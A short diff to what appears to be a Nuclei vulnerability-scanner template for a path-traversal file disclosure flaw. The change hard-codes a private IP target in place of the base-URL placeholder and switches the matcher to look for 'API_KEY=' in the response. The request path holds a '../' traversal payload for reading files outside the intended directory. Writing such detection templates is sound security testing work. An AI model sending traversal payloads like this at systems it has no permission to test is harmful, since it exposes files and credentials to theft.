@@ -4,15 +4,15 @@ info:
   name: Sensitive file disclosure via insecure path validation
   author: vignesh
   severity: high
-  description: Application allows reading files outside the intended directory, exposing sensitive content
+  description: Application allows reading files outside the intended directory, exposing sensitive file contents
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/download?file=../files_evil/secret.txt"
+      - "http://172.31.138.39:8002/download?file=../files_evil/secret.txt"
 
     matchers:
       - type: word
         part: body
         words:
-          - "SECRET DATA"
+          - "API_KEY="
